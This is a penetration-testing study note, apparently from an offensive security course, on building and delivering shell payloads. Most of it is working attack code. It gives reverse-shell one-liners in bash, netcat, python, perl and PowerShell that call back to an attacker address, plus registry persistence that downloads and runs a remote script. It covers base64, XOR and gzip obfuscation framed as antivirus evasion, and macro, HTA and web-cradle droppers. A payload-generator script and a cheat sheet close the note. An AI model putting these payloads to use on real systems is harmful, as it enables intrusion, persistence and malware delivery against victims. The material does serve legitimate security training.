---
tags: [module/shells-payloads, payloads, one-liners, nishang, powershell, bash, payload-development, level/advanced, practical]
---

# Introduction to Payloads - Practical Application

## Complete Payload Analysis Workflow

Phase 1: Linux Payload Deep Dive
Phase 2: PowerShell Payload Deep Dive
Phase 3: Nishang Framework Analysis
Phase 4: Payload Customization
Phase 5: Payload Encoding
Phase 6: Payload Delivery Methods
Phase 7: Automation

---

## Phase 1: Linux Payload Deep Dive

### The Classic Netcat/Bash One-Liner

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER-IP 7777 > /tmp/f

### Component Breakdown

| Component | Description |
|-----------|-------------|
| rm -f /tmp/f | Force remove any existing pipe |
| mkfifo /tmp/f | Create a named pipe (FIFO) |
| cat /tmp/f | Read from the pipe |
| /bin/bash -i | Start interactive bash |
| 2>&1 | Redirect stderr to stdout |
| nc ATTACKER-IP 7777 | Connect to attacker |
| > /tmp/f | Redirect output to pipe |

### Visual Data Flow

Attacker <---> Netcat <---> Pipe <---> Bash

### Alternative Linux Payloads

# Without netcat (using bash only)
bash -i >& /dev/tcp/ATTACKER-IP/7777 0>&1

# Using python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Using perl
perl -e 'use Socket;$i="ATTACKER-IP";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

---

## Phase 2: PowerShell Payload Deep Dive

### Full PowerShell One-Liner Analysis

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

### Component Breakdown

| Component | Description |
|-----------|-------------|
| powershell -nop -c | Start PowerShell with no profile, execute command |
| New-Object TCPClient | Create TCP connection object |
| GetStream() | Get network stream for communication |
| [byte[]]$bytes | Create byte array buffer (65535 bytes) |
| while($stream.Read) | Read incoming data from stream |
| New-Object ASCIIEncoding | Convert bytes to ASCII text |
| iex $data | Invoke-Expression - execute the command |
| Out-String | Convert output to string |
| pwd).Path | Get current working directory |
| $stream.Write | Send results back |
| $stream.Flush() | Clear the stream buffer |
| $client.Close() | Close connection when done |

### PowerShell Execution Flow

1. Connect to attacker
2. Wait for command
3. Read command from stream
4. Execute command with iex
5. Capture output
6. Send output back
7. Repeat until exit

---

## Phase 3: Nishang Framework Analysis

### What is Nishang?

Nishang is a collection of offensive PowerShell scripts. The `Invoke-PowerShellTcp` function is a well-documented version of our reverse shell.

### Key Components of Invoke-PowerShellTcp

function Invoke-PowerShellTcp 
{
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]$IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]$Port,

        [Parameter(ParameterSetName="reverse")][Switch]$Reverse,
        [Parameter(ParameterSetName="bind")][Switch]$Bind
    )

### Notable Features

- **Parameter sets**: Supports both reverse and bind shells
- **Error handling**: try/catch blocks
- **Connection management**: Proper cleanup
- **User feedback**: Sends banner with username/computername
- **Interactive prompt**: Shows PS prompt with current directory

### Why Nishang Matters

- Readable, well-documented code
- Used in real engagements
- Educational resource
- Customizable for specific needs
- Shows proper PowerShell scripting practices

---

## Phase 4: Payload Customization

### Modifying the PowerShell Payload

# Change the port
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5', 8080)

# Change the prompt
$sendback2 = $sendback + 'CUSTOM> '

# Add banner
$banner = "Connected to " + $env:computername + "`n"
$stream.Write(([text.encoding]::ASCII).GetBytes($banner),0,$banner.Length)

### Obfuscating Variable Names

$a = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);
$b = $a.GetStream();
[byte[]]$c = 0..65535|%{0};
while(($d = $b.Read($c, 0, $c.Length)) -ne 0){
    $e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d);
    $f = (iex $e 2>&1 | Out-String );
    $g = $f + 'PS> ';
    $h = ([text.encoding]::ASCII).GetBytes($g);
    $b.Write($h,0,$h.Length);
    $b.Flush()
};
$a.Close()

### Adding Persistence

# After shell, add persistence
$command = "New-ItemProperty -Path HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Updater -Value 'powershell -c IEX (New-Object Net.WebClient).DownloadString(''http://10.10.14.5/rev.ps1'')'"
iex $command

---

## Phase 5: Payload Encoding

### Base64 Encoding PowerShell

# Encode the command
$command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5/rev.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Execute
powershell -EncodedCommand $encoded

### XOR Obfuscation

function XOR-Encode {
    param($data, $key)
    $result = ""
    for($i=0; $i -lt $data.Length; $i++) {
        $result += [char]($data[$i] -bxor $key[$i % $key.Length])
    }
    return $result
}

$payload = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5/rev.ps1")'
$key = [char[]]'secret'
$encoded = XOR-Encode $payload $key

### Compression

# Compress payload
$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
$ms = New-Object System.IO.MemoryStream
$cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
$cs.Write($bytes, 0, $bytes.Length)
$cs.Close()
$compressed = [Convert]::ToBase64String($ms.ToArray())

---

## Phase 6: Payload Delivery Methods

### Web Delivery

# Host payload on web server
python3 -m http.server 8000

# Download and execute
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/rev.ps1')"

### Macro Delivery (Office)

# VBA macro
Sub AutoOpen()
    Shell "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/rev.ps1')"
End Sub

### HTA Delivery

<html>
<head>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/rev.ps1')");
</script>
</head>
<body></body>
</html>

### Certificate Payloads

# Embed payload in certificate
openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=$(cat rev.ps1 | base64 -w0)"

---

## Phase 7: Automation

### Payload Generator Script

Save as payload-gen.py:

#!/usr/bin/env python3
import argparse
import base64

def generate_powershell_payload(lhost, lport, obfuscate=False):
    payload = f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()'''
    
    if obfuscate:
        # Simple obfuscation - reverse variable names
        payload = payload.replace('$client', '$c')
        payload = payload.replace('$stream', '$s')
        payload = payload.replace('$bytes', '$b')
        payload = payload.replace('$data', '$d')
        payload = payload.replace('$sendback', '$sb')
        payload = payload.replace('$sendback2', '$sb2')
        payload = payload.replace('$sendbyte', '$sbyte')
    
    return f"powershell -nop -c \"{payload}\""

def generate_bash_payload(lhost, lport):
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

def generate_nc_payload(lhost, lport):
    return f"nc -e /bin/sh {lhost} {lport}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--lhost', required=True)
    parser.add_argument('--lport', required=True, type=int)
    parser.add_argument('--type', choices=['powershell','bash','nc'], default='powershell')
    parser.add_argument('--obfuscate', action='store_true')
    args = parser.parse_args()
    
    if args.type == 'powershell':
        cmd = generate_powershell_payload(args.lhost, args.lport, args.obfuscate)
    elif args.type == 'bash':
        cmd = generate_bash_payload(args.lhost, args.lport)
    else:
        cmd = generate_nc_payload(args.lhost, args.lport)
    
    print("[*] Payload:")
    print(cmd)

### Payload Tester Script

Save as test-payload.sh:

#!/bin/bash
PAYLOAD=$1

echo "[*] Testing payload: $PAYLOAD"
echo "[*] Length: ${#PAYLOAD} characters"

# Check for obvious AV signatures
if echo "$PAYLOAD" | grep -q "Invoke-Expression\|IEX\|System.Net.Sockets.TCPClient"; then
    echo "[!] Contains common AV signatures"
fi

# Base64 encode for testing
ENCODED=$(echo -n "$PAYLOAD" | base64 -w0)
echo "[*] Base64 encoded length: ${#ENCODED}"

---

## Payload Cheatsheet

| Payload Type | Command |
|--------------|---------|
| Linux Bash | bash -i >& /dev/tcp/10.10.14.5/443 0>&1 |
| Linux Netcat | nc -e /bin/sh 10.10.14.5 443 |
| Linux Python | python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' |
| Windows PowerShell | powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" |

---

## Key Takeaways

- Payloads are just instructions - understand them
- Break down one-liners to learn how they work
- Linux payloads use pipes and redirection
- PowerShell payloads use .NET objects
- Nishang provides readable, well-documented examples
- Variable obfuscation helps evade detection
- Base64 encoding bypasses some signatures
- Payload delivery methods vary by target
- Automation helps generate consistent payloads
- Always test your payloads before deployment
- Understanding payloads is key to AV evasion
- The more you know, the better you can adapt
